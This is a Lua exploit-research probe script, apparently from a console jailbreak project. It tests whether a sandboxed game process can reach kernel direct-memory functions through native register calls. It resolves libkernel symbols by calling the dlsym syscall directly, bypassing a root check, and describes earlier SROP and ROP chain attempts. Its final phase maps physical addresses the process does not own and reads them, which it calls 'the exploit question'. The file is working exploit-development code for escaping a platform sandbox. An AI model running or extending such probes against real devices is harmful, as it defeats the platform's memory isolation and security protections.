-- CRASH_CLASS: MODERATE
-- PROBE 1522a: sceKernelMapDirectMemory via native.fcall (6 register args, no SROP)
--
-- -- prior art:
--   probes/phase27_phys_memory/528f_mainthread_mapdm.lua  -- AllocateDirectMemory via
--     native.fcall_with_rax worked (phys=0x110010000) but MapDirectMemory was attempted
--     with a 7-arg main-thread SROP and died at "[B] [1] flags=0x0".
--     results/phase27_phys_memory/528f_mainthread_mapdm_20261025_093141.txt
--   probes/phase27_phys_memory/528h_mapdm_debug.lua -- GetDirectMemorySize via SROP = 0x50000000,
--     MapDirectMemory via SROP (with hint) died. results/.../528h_mapdm_debug_20261025_093940.txt
--   probes/phase17_new_vectors/1188a_fcall_validate.lua -- native.fcall(fn, rdi..r9) works.
--   .local/loader_payload/gpu.lua:344 alloc_main_dmem -- the payload's own working call shape:
--     sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size)  == SIX arguments,
--     all in registers (rdi,rsi,rdx,rcx,r8,r9). No stack argument, therefore no SROP needed.
--   .local/loader_payload/misc.lua:487 dlsym -- syscall 0x24f, and the payload itself uses
--     dlsym(LIBKERNEL_HANDLE, "sceKernelGetModuleInfo") successfully, so the resolver is live;
--     the hardcoded libkernel+0x17EF0/+0x15020 offsets in 528f were never necessary.
--   docs/DEAD_ENDS.md MapDM bullet -- "MapDirectMemory was never called" is false for 546c/552a
--     (they died in a fault dump while entering it); no run has ever returned from it.
--
-- Why this probe: every previous MapDirectMemory attempt went through a hand-built SROP frame
-- or a child-thread ROP chain and died before returning. native.fcall_with_rax gives six
-- register arguments from the MAIN thread with no frame, which is exactly the payload's own
-- call shape. If it returns 0, this is the first measured successful MapDirectMemory on 14.10.
-- Phase [F] then asks the exploit question: does it accept a physical address we do not own?
-- Reads only -- no store is ever made into a page we did not allocate.

print("=== PROBE 1522a: MAPDIRECTMEMORY VIA 6-ARG FCALL ===")
print("")

local function N(v)
    if type(v) == "number" then return v end
    if type(v) == "table" and v.tonumber then
        local ok, n = pcall(function() return v:tonumber() end)
        if ok and n then return n end
    end
    local ok, n = pcall(function() return tonumber(v) end)
    if ok and n then return n end
    return 0
end
-- memory.alloc returns a userdata; tonumber() on it yields the address.
local function addr_of(u)
    local n = N(u)
    if n >= 0x10000 and n < 0x8000000000 then return n end
    return nil
end
local function U(v)
    if type(v) == "userdata" then return v end
    return uint64(v)
end
local function mk(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return N(v) end
    return nil
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) % 4294967296 end
    return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local n = N(v)
    if n < 0 then n = n + 2 ^ 64 end
    return string.format("0x%X", n)
end

-- getpid the ordinary way as a liveness reference
local function self_pid()
    local ok, v = pcall(function() return getpid() end)
    if ok then return N(v) end
    return -1
end
local PID0 = self_pid()
print("pid=" .. tostring(PID0))

-- ============================================================
-- [A] environment: is dlsym reachable from a remote script?
-- ============================================================
print("")
print("[A] environment")
print("  type(dlsym)                = " .. type(dlsym))
print("  type(native)               = " .. type(native))
print("  type(native.fcall_with_rax)= " .. type(native.fcall_with_rax))
print("  type(fcall)                = " .. type(fcall))
print("  type(memory.alloc)         = " .. type(memory.alloc))
do
    local okg, g = pcall(function() return syscall.getuid():tonumber() end)
    local oks, sb = pcall(function() return syscall.is_in_sandbox():tonumber() end)
    print("  getuid()                   = " .. (okg and tostring(g) or "raised"))
    print("  is_in_sandbox()            = " .. (oks and tostring(sb) or "raised"))
end
print("  dlsym wrapper gate         = getuid()==0, so the wrapper raises; using syscall.dlsym")

local LIBKERNEL = 0x2001

-- The Lua wrapper misc.lua:487 dlsym() gates on check_jailbroken() -> getuid()==0,
-- which is false for a game process (uid 1). The syscall it wraps (0x24f) does not
-- check, so call syscall.dlsym directly.
local DLSYM_ISSUES = {}
local function sym(name)
    local out = memory.alloc(8)
    local outaddr = addr_of(out)
    if not outaddr then return nil, "no out buffer" end
    memory.write_qword(out, uint64(0))

    local ok, rv = pcall(function()
        return syscall.dlsym(uint64(LIBKERNEL), name, uint64(outaddr))
    end)
    if ok then
        local n = N(rv)
        local a = rq(outaddr)
        if n ~= -1 and a and a > 0x10000 then return a end
        DLSYM_ISSUES[#DLSYM_ISSUES + 1] = name .. ":raw rv=" .. tostring(n) .. " out=" .. fmt(a)
    else
        DLSYM_ISSUES[#DLSYM_ISSUES + 1] = name .. ":raw raised " .. tostring(rv)
    end

    -- fallback: the Lua wrapper never runs here because it raises first
    return nil, table.concat(DLSYM_ISSUES, "; ")
end

local getdmsz, e1 = sym("sceKernelGetDirectMemorySize")
local allocdm, e2 = sym("sceKernelAllocateDirectMemory")
local mapdm,   e3 = sym("sceKernelMapDirectMemory")
local mapdm2,  e4 = sym("sceKernelMapDirectMemory2")
local mapnamed,e5 = sym("sceKernelMapNamedDirectMemory")
local release, e6 = sym("sceKernelReleaseDirectMemory")

print("  GetDirectMemorySize      = " .. (getdmsz and fmt(getdmsz) or ("FAIL " .. tostring(e1))))
print("  AllocateDirectMemory     = " .. (allocdm and fmt(allocdm) or ("FAIL " .. tostring(e2))))
print("  MapDirectMemory          = " .. (mapdm and fmt(mapdm) or ("FAIL " .. tostring(e3))))
print("  MapDirectMemory2         = " .. (mapdm2 and fmt(mapdm2) or ("FAIL " .. tostring(e4))))
print("  MapNamedDirectMemory     = " .. (mapnamed and fmt(mapnamed) or ("FAIL " .. tostring(e5))))
print("  ReleaseDirectMemory      = " .. (release and fmt(release) or ("FAIL " .. tostring(e6))))

if not mapdm then
    print("")
    print("VERDICT: MapDirectMemory did not resolve; nothing else is meaningful.")
    return
end

local function call6(fn, rdi, rsi, rdx, rcx, r8, r9)
    local ok, rv = pcall(function()
        return native.fcall_with_rax(U(fn), U(0), U(rdi), U(rsi), U(rdx), U(rcx), U(r8), U(r9))
    end)
    if not ok then return nil end
    return N(rv)
end

-- ============================================================
-- [B] prove fcall reaches libkernel at all
-- ============================================================
print("")
print("[B] GetDirectMemorySize via fcall")
if getdmsz then
    local sz = call6(getdmsz, 0, 0, 0, 0, 0, 0)
    print("  rv=" .. tostring(sz) .. " size=" .. fmt(sz))
    if sz == nil then print("  fcall did not return"); end
else
    print("  skipped (unresolved)")
end

-- ============================================================
-- [C] allocate a direct-memory block we DO own
-- ============================================================
print("")
print("[C] AllocateDirectMemory(0, 0x150000000, 0x4000, 0x4000, 0, &phys)")
local phys_out = memory.alloc(8)
memory.write_qword(phys_out, uint64(0))
local phys = nil
if allocdm then
    local pa_addr = addr_of(phys_out)
    if not pa_addr then print("  ABORT: phys-out pointer unresolvable") return end
    local rv = call6(allocdm, U(0), U(0x150000000), U(0x4000), U(0x4000), U(0), U(pa_addr))
    print("  rv=" .. tostring(rv))
    if rv == 0 then
        phys = rq(pa_addr)
        print("  phys=" .. fmt(phys))
    end
end
if not phys or phys < 0x1000 then
    print("  no block allocated -- [D] will map phys 0 as the control")
end

-- ============================================================
-- [D] MapDirectMemory, SIX register arguments, main thread
-- ============================================================
print("")
print("[D] MapDirectMemory(&va, 0x4000, 3, 0, phys, 0x4000)  -- 6 args, no SROP")

local function try_map(label, physaddr, flags, prot)
    local vo = memory.alloc(8)
    local voaddr = addr_of(vo)
    if not voaddr then print("    ABORT: out-pointer address unresolvable"); return nil, nil end
    memory.write_qword(vo, uint64(0))
    print("  attempting " .. label .. " phys=" .. fmt(physaddr) .. " flags=" .. fmt(flags) .. " prot=" .. fmt(prot))
    local rv = call6(mapdm, voaddr, 0x4000, prot, flags, physaddr, 0x4000)
    if rv == nil then
        print("    -> fcall did not return (trap or crash)")
        return nil, nil
    end
    local va = rq(voaddr)
    print("    -> rv=" .. tostring(rv) .. " va=" .. fmt(va))
    return rv, va
end

local MAP_OK = false
local va1 = nil
if phys then
    local rv, va = try_map("owned", phys, 0, 3)
    if rv == 0 and va and va > 0x10000 then
        MAP_OK = true
        va1 = va
        print("    MAP WORKS. first 8 dwords:")
        local line = "      "
        for i = 0, 7 do
            line = line .. string.format("%08X ", rd(va + i * 4) or 0)
        end
        print(line)
        -- prove it is real memory: write a marker (we own this block)
        local okw = pcall(function() memory.write_dword(va, uint64(0x52414D31)) end)
        local back = okw and rd(va) or nil
        print("      marker write back = " .. string.format("%08X", back or 0) ..
              (back == 0x52414D31 and "  (RW CONFIRMED)" or "  (not writable)"))
    else
        print("    owned-block map failed; trying flags 0x1000 / prot 1 as alternates")
        local rv2, va2 = try_map("owned/f1000", phys, 0x1000, 3)
        if rv2 == 0 and va2 and va2 > 0x10000 then
            MAP_OK = true; va1 = va2
            print("    MAP WORKS with flags 0x1000")
        else
            local rv3, va3 = try_map("owned/p1", phys, 0, 1)
            if rv3 == 0 and va3 and va3 > 0x10000 then
                MAP_OK = true; va1 = va3
                print("    MAP WORKS with prot 1")
            end
        end
    end
else
    print("  skipped: no owned physical block")
end

if not MAP_OK then
    print("")
    print("VERDICT: MapDirectMemory did not return a mapping on 14.10.")
    print("pid_after=" .. tostring(self_pid()) .. " (was " .. tostring(PID0) .. ")")
    return
end

-- ============================================================
-- [E] release the block and confirm the API is a real allocator
-- ============================================================
print("")
print("[E] ReleaseDirectMemory(phys, 0x4000)")
if release and phys then
    local rv = call6(release, U(phys), U(0x4000), U(0), U(0), U(0), U(0))
    print("  rv=" .. tostring(rv))
else
    print("  skipped")
end

-- ============================================================
-- [F] THE QUESTION: does it accept a physical address we do not own?
--     Read only. No store is made into these mappings.
-- ============================================================
print("")
print("[F] MapDirectMemory at physical addresses outside our allocation (READ ONLY)")
local probes_phys = { 0x0, 0x1000, 0x100000, 0x1000000, 0x8000000, 0x10000000 }
for i, pa in ipairs(probes_phys) do
    if phys and pa == phys then
        print("  [F" .. i .. "] phys=" .. fmt(pa) .. " skipped (ours)")
    else
        local vo = memory.alloc(8)
        local voaddr = addr_of(vo)
        if not voaddr then print("  [F" .. i .. "] ABORT: out-pointer unresolvable"); break end
        memory.write_qword(vo, uint64(0))
        print("  [F" .. i .. "] phys=" .. fmt(pa) .. " requesting prot 1")
        local rv = call6(mapdm, voaddr, 0x1000, 1, 0, pa, 0x1000)
        if rv == nil then
            print("      -> fcall did not return (trap or crash)")
            break
        end
        local va = rq(voaddr)
        print("      -> rv=" .. tostring(rv) .. " va=" .. fmt(va))
        if rv == 0 and va and va > 0x10000 then
            local d0 = rd(va)
            local d1 = rd(va + 4)
            local d2 = rd(va + 8)
            local d3 = rd(va + 12)
            if d0 then
                print(string.format("      READS: %08X %08X %08X %08X",
                    d0 % 4294967296, (d1 or 0) % 4294967296,
                    (d2 or 0) % 4294967296, (d3 or 0) % 4294967296))
                print("      *** A MAPPING OF PHYSICAL " .. fmt(pa) .. " SUCCEEDED ***")
            else
                print("      mapped but the first read faulted")
            end
        end
    end
end

print("")
print("[G] final")
print("pid_after=" .. tostring(self_pid()) .. " (was " .. tostring(PID0) .. ")")
print("")
print("=== PROBE 1522a COMPLETE ===")
